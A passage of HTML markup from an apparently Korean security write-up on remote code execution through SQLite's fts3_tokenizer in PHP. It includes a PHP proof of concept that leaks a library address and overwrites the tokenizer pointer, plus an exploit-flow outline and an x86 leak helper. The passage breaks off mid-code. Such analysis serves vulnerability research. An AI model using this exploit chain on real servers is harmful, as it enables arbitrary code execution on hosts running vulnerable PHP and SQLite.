class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-declaration\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>pIcu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      rc <span class=\"token operator\">=</span> <span class=\"token constant\">SQLITE_NOMEM</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">const</span> sqlite3_tokenizer_module simpleTokenizerModule <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n simpleCreate<span class=\"token punctuation\">,</span>\n simpleDestroy<span class=\"token punctuation\">,</span>\n simpleOpen<span class=\"token punctuation\">,</span>\n simpleClose<span class=\"token punctuation\">,</span>\n simpleNext<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">built-in tokenizer</code> 는 hash-table에 로드되며 해당 주소는 libsqlite3 의 .bss 섹션을 참조되고 있습니다.</li>\n</ul>\n<h3 id=\"sqlite-fts3_tokenizer-fts3_tokenizer\" style=\"position:relative;\"><a href=\"#sqlite-fts3_tokenizer-fts3_tokenizer\" aria-label=\"sqlite fts3_tokenizer fts3_tokenizer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SQLite fts3_tokenizer(), fts3_tokenizer()</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token constant\">SELECT</span> <span class=\"token function\">fts3_tokenizer</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>tokenizer<span class=\"token operator\">-</span>name<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&lt;</span>sqlite3_tokenizer_module ptr<span class=\"token operator\">></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>하나의 인수, 두 개의 인수로 fts3_tokenizer 함수를 호출할 수 있습니다. 첫 번째 인자는 해당 함수에서 <code class=\"language-text\">tokenizer</code>를 식별하는 문자열이며 <code class=\"language-text\">slqite3_tokenizer_module</code> 구조체에 대한 포인터입니다.</li>\n<li>즉, 하나의 인수가 전달되면 현재 등록된 tokenizer 구현에 대한 포인터가 반환되고 두 번째 인수는 tokenizer를 등록할 사본이 반환되어 집니다.</li>\n</ul>\n<h2 id=\"fts3-callback을-통한-임의의-코드-실행-취약점\" style=\"position:relative;\"><a href=\"#fts3-callback%EC%9D%84-%ED%86%B5%ED%95%9C-%EC%9E%84%EC%9D%98%EC%9D%98-%EC%BD%94%EB%93%9C-%EC%8B%A4%ED%96%89-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"fts3 callback을 통한 임의의 코드 실행 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 callback을 통한 임의의 코드 실행 취약점</h2>\n<ul>\n<li>앞서 취약한 부분의 쿼리인 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 인자에 임의의 값을 입력한 경우 크래쉬가 발생한 것을 확인할 수 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">ob_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getmypid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\" \"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1212</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ob_end_flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">-=</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">.=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">query</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select hex(fts3_tokenizer('simple')) addr;\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">fetchArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$leaked_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leaked_addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SQLite3</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\":memory:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"select fts3_tokenizer('simple', x'4141414141414141');\n        create virtual table a using fts3(tokenizer=simple);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span>\n</code></pre></div>\n<ul>\n<li>크래쉬가 발생한 부분을 분석해보면 <code class=\"language-text\">rbp</code> 레지스터 값이 <code class=\"language-text\">fts3_tokenizer</code> 두 번째 파라미터인 것을 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAACH0lEQVQ4y5WTe3OaUBDFb9SoURAEAXnJQyHg+xk1PpMYTaYzneb7f5jTudsmjTNJ0/6xc2GA356ze2Cu18FossNydYTf7OMiK0NWGqjpISw3hVR16fqqbNCzTK7612KiZGO+PODu8B3D8RaXhRpsN4UX9KhJ0BqgIjvIXir/BiyLJkaTLW7XJ6SdG/rQMGPo9RZ6gxXC1hAlwQS7qNAHX0GZKDkEO5xeMJntSWHQHJDKTm9Jlr9SdQbk3QejNea3j4iTKQEtJ4FmtCBULDAm/h/wTeHxBcPxhoB+2CdgWeTAMtmlykhnxe2/1huQqxiMNlisjkg7c+TyKkwnIXVOo01gpRZA1QJqkC9qKJZ0Oj9UyDfIt/nw+IOW8GqZw9bbZ4yne1JuOSkBOZg34dH61PJ4usNq84Tu4JaAdSsmIM+naV+j4XdpUbRtPgIm0gg+tMxzOJvfY7v/RlvlQNNOCMoVzuYPaHcXuFkcaLZ8FLw+XQqPBQfu7n4B+Qw9vwvHTckq/5OEik3x4c0F0UKxZPzJJQe9V3glmBjP9lhunhC3Z8jmVWj1CLoZoTdao91bwrBiMCYgV6hBUhqo1gLIqgdGoPOgs8iOsZ7ucNo9Y5hMUMkrCK0IgRXRfeQmMKsu1LIBTTRRlx0qU3ZQyau/oe+Am/YUfb+DSPMRKg0YBZVOv+rAk2yEagO+7CDSAzRrHr3X0nxc6wGskgaWOQf+BFo6ZHwLayVXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"php_in.png\"\n        title=\"php_in.png\"\n        src=\"/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png\"\n        srcset=\"/static/895cf1cf65041b4a6f0abd6f963b6726/e9ff0/php_in.png 180w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/f21e7/php_in.png 360w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/37523/php_in.png 720w,\n/static/895cf1cf65041b4a6f0abd6f963b6726/1cfc2/php_in.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>SQLite3가 <code class=\"language-text\">xCreate</code> callback function pointer를 호출하였고 이에 대한 Callback 호출에 대한 임계값 검증이 존재하지 않았기 때문에 발생하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_tokenizer.c</span>\nm <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>sqlite3_tokenizer_module <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">sqlite3Fts3HashFind</span><span class=\"token punctuation\">(</span>pHash<span class=\"token punctuation\">,</span>z<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>z<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>m <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n    <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer: %s\"</span><span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    rc <span class=\"token operator\">=</span> SQLITE_ERROR<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n\t<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    <span class=\"token punctuation\">}</span>\n    rc <span class=\"token operator\">=</span> m<span class=\"token operator\">-></span><span class=\"token function\">xCreate</span><span class=\"token punctuation\">(</span>iArg<span class=\"token punctuation\">,</span> aArg<span class=\"token punctuation\">,</span> ppTok<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token operator\">||</span> <span class=\"token operator\">*</span>ppTok <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> rc<span class=\"token operator\">!=</span>SQLITE_OK <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n      <span class=\"token function\">sqlite3Fts3ErrMsg</span><span class=\"token punctuation\">(</span>pzErr<span class=\"token punctuation\">,</span> <span class=\"token string\">\"unknown tokenizer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span>\n      <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>ppTok<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>pModule <span class=\"token operator\">=</span> m<span class=\"token punctuation\">;</span> \n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">sqlite3_free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>aArg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span></code></pre></div>\n<h2 id=\"xopen-취약점\" style=\"position:relative;\"><a href=\"#xopen-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"xopen 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>xOpen 취약점</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\"><span class=\"token keyword\">insert</span> <span class=\"token keyword\">into</span> exploit <span class=\"token keyword\">values</span><span class=\"token punctuation\">(</span>x<span class=\"token string\">\"9090909090909090\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>현 쿼리의 “exploit” 테이블은 앞에서 create 쿼리문으로 생성이 된후 insert 쿼리문을 이용해서 데이터를 삽입할 경우 <code class=\"language-text\">xOpen</code> Callback function pointer가 수행됩니다.</li>\n<li><code class=\"language-text\">xOpen</code> 은 값 으로 0x9090909090909090 16진수를 <code class=\"language-text\">pInput1</code> 매개 변수로 사용하여 CallBack 과 같이 트리거 됩니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token comment\">// https://github.com/mackyle/sqlite/blob/0ab6f6f4c9142a55959ed2097734942c1781b538/ext/fts3/fts3_expr.c</span>\nsqlite3_tokenizer_module <span class=\"token keyword\">const</span> <span class=\"token operator\">*</span>pModule <span class=\"token operator\">=</span> pTokenizer<span class=\"token operator\">-></span>pModule<span class=\"token punctuation\">;</span>\nsqlite3_tokenizer_cursor <span class=\"token operator\">*</span>pCsr <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">int</span> rc<span class=\"token punctuation\">;</span>\nrc <span class=\"token operator\">=</span> pModule<span class=\"token operator\">-></span><span class=\"token function\">xOpen</span><span class=\"token punctuation\">(</span>pTokenizer<span class=\"token punctuation\">,</span> z<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pCsr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>이를 이용해서 예측이 가능한 메모리 위치에 대상 주소를 만들고 메모리 주소에 있어 <code class=\"language-text\">fts3_tokenizer</code> 의 Callback 을 트리거하여 다음 프로그램 카운터를 조작해 원하는 파라미터 값을 컨트롤해 공격 연계가 가능합니다.</li>\n</ul>\n<h1 id=\"fts3-php-rce-exploitation\" style=\"position:relative;\"><a href=\"#fts3-php-rce-exploitation\" aria-label=\"fts3 php rce exploitation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3 PHP RCE Exploitation</h1>\n<h2 id=\"exploit-공격-흐름도\" style=\"position:relative;\"><a href=\"#exploit-%EA%B3%B5%EA%B2%A9-%ED%9D%90%EB%A6%84%EB%8F%84\" aria-label=\"exploit 공격 흐름도 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 공격 흐름도</h2>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">$sqlite3_lib_leaked_tokenizer <span class=\"token operator\">=</span> sqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select hex(fts3_tokenizer('simple')) addr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$libsqlite3_addr <span class=\"token operator\">=</span> flip<span class=\"token punctuation\">(</span>$sqlite3_lib_leaked_tokenizer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n$libsqlite3_base <span class=\"token operator\">=</span> $libsqlite3_addr <span class=\"token operator\">-</span> $leaked_simple_tokenizer_offset<span class=\"token punctuation\">;</span>\n\n$payload <span class=\"token operator\">=</span> <span class=\"token number\">0x9090909090909090</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// payload </span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"select fts3_tokenizer('simple', ?);\"</span><span class=\"token punctuation\">,</span> $payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nsqlQuery<span class=\"token punctuation\">(</span><span class=\"token string\">\"create table a using fts3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// crash</span></code></pre></div>\n<ul>\n<li>다음과 같은 형태로 취약점 Exploit 흐름이 진행되어 집니다.</li>\n<li>x86 환경에서의 취약점은 <code class=\"language-text\">xCreate</code> 의 Callback 트리거 만으로 Exploit 진행이 어렵다고 판단하여 <code class=\"language-text\">xOpen</code> 의 인자 트리거를 통해 진행하였습니다.</li>\n</ul>\n<h2 id=\"x86bit-환경-php-with-sqlite3-fts3-tokenizer-rce-취약점\" style=\"position:relative;\"><a href=\"#x86bit-%ED%99%98%EA%B2%BD-php-with-sqlite3-fts3-tokenizer-rce-%EC%B7%A8%EC%95%BD%EC%A0%90\" aria-label=\"x86bit 환경 php with sqlite3 fts3 tokenizer rce 취약점 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>x86bit 환경 PHP with SQLite3 fts3 tokenizer RCE 취약점</h2>\n<h3 id=\"fts3_tokenizer-info-leak\" style=\"position:relative;\"><a href=\"#fts3_tokenizer-info-leak\" aria-label=\"fts3_tokenizer info leak permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>fts3_tokenizer info leak</h3>\n<ul>\n<li>leak 된 simple tokenizer의 주소 값을 리틀 엔디안으로 변경 작업을 진행시 4바이트 기준으로 fllip을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\n  <span class=\"token variable\">$len</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$val</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_repeat</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$len</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">></span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token variable\">$result</span><span class=\"token operator\">.=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$val</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token variable\">$result</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token variable\">$db</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token 